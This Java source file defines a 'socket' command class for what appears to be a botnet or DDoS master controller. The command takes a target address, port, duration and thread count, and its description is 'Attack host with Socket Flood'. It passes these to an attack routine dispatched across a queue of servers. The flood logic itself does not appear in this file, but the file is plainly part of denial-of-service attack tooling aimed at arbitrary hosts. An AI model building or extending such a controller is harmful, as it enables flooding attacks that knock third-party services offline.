package org.anywhere.master.command.impl.methods;

import org.anywhere.master.command.Command;
import org.anywhere.master.encoder.EncoderManager;
import org.anywhere.master.server.ServerData;

import java.util.concurrent.ConcurrentLinkedQueue;

public class CommandSocket extends Command {

    private final ConcurrentLinkedQueue<ServerData> serverData;
    private final EncoderManager encoderManager;

    public CommandSocket(final ConcurrentLinkedQueue<ServerData> serverData, final EncoderManager encoderManager) {
        super("socket", "sockets", "socket <address> <port> <time> [threads]", "Attack host with Socket Flood (default: 5 threads)", true);
        this.serverData = serverData;
        this.encoderManager = encoderManager;
    }

    @Override
    public void execute(final String[] args) {
        super.attack(args, "socket", this.encoderManager, this.serverData);
    }
}